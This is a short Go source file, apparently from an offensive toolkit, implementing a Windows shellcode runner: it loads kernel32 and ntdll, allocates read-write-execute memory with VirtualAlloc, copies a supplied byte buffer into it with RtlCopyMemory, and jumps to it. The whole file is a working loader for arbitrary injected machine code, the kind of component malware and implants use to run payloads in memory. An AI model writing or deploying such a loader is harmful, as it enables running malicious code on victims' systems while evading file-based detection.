package shellcode

import (
	"syscall"
	"unsafe"

	"../util"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

// Runner runner
func Runner(shellcode []byte) bool {
	address, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if util.CheckErrorMessage(err) {
		return false
	}
	_, _, err = RtlCopyMemory.Call(address, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if util.CheckErrorMessage(err) {
		return false
	}
	syscall.Syscall(address, 0, 0, 0, 0)
	return true
}

// IsAvailable does a shellcode runner exist
func IsAvailable() bool {
	return true
}
